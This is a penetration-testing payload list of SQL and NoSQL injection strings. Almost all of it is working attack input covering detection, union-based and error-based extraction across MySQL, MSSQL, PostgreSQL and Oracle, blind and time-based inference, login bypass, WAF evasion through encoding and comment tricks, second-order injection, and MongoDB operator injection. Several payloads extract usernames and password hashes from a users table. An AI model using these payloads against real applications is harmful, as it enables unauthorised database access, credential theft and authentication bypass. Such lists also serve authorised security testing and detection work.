## ============================================================
## SQL Injection Payloads — Real-World VAPT Collection
## ============================================================

## ---- DETECTION / IDENTIFICATION ----
'
''
`
"
")
'))
;
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
" OR 1=1--
OR 1=1--
' OR 'a'='a
1' ORDER BY 1--
1' ORDER BY 100--
1 AND 1=1
1 AND 1=2
1' AND '1'='1
1' AND '1'='2
1 UNION SELECT NULL--
' HAVING 1=1--
' GROUP BY columnname HAVING 1=1--

## ---- UNION BASED ----
# Column enumeration
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# Data extraction (MySQL)
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--

# Data extraction (MSSQL)
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,DB_NAME(),3--
' UNION SELECT 1,name,3 FROM master..sysdatabases--
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

# Data extraction (PostgreSQL)
' UNION SELECT 1,version(),3--
' UNION SELECT 1,current_database(),3--
' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--

## ---- ERROR BASED ----
# MySQL
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND exp(~(SELECT * FROM (SELECT user())a))--

# MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CAST((SELECT @@version) AS int)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

# PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--

# Oracle
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--

## ---- BLIND BOOLEAN ----
# MySQL
' AND SUBSTRING(@@version,1,1)='5'--
' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>64--
' AND IF(1=1,'a','b')='a'--
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND LENGTH(password)>5)=1--

# MSSQL
' AND SUBSTRING((SELECT @@version),1,1)='M'--
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--

# PostgreSQL
' AND SUBSTRING(version(),1,1)='P'--

## ---- TIME BASED (BLIND) ----
# MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
' AND (SELECT SLEEP(5) FROM users WHERE username='admin')--
1' AND BENCHMARK(10000000,SHA1('test'))--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin')=1 WAITFOR DELAY '0:0:5'--

# PostgreSQL
'; SELECT pg_sleep(5)--
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--

# Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

## ---- AUTH BYPASS ----
admin' --
admin' #
admin'/*
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
') OR ('1'='1'--
' OR '1'='1
' OR 'x'='x
' OR 1=1 LIMIT 1--
admin' OR '1'='1
" OR ""="
" OR 1=1--

## ---- WAF BYPASS ----
# Inline comments
/*!50000SELECT*/ @@version
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' UN/**/ION SE/**/LECT 1,2,3--
' %55NION %53ELECT 1,2,3--

# Case variation
' uNiOn SeLeCt 1,2,3--

# Encoding
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' UNION%0aSELECT%0a1,2,3--
' UNION%09SELECT%091,2,3--
' UNION%0dSELECT%0d1,2,3--

# Scientific notation (bypass numeric filters)
' OR 1e0=1e0--
' UNION SELECT 1e0,2e0,3e0--

# Null bytes
%00' UNION SELECT 1,2,3--

# Double URL encoding
%2527 UNION SELECT 1,2,3--

# HPP (HTTP Parameter Pollution)
?id=1&id=' UNION SELECT 1,2,3--

## ---- SECOND-ORDER SQLi ----
# Register username with SQLi payload, trigger when admin views it
admin'-- (as username during registration)
' UNION SELECT 1,@@version,3-- (as profile field, triggered on admin report)

## ---- NoSQL INJECTION (MongoDB) ----
# Auth bypass
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$exists": true}}

# Data extraction
{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": "^p"}}

# JavaScript injection ($where)
{"$where": "this.username == 'admin'"}
{"$where": "function(){return true}"}
'; return true; var x='
'; sleep(5000); var x='

# NoSQL via URL parameters
username[$ne]=invalid&password[$ne]=invalid
username=admin&password[$gt]=
username[$regex]=admin.*&password[$gt]=
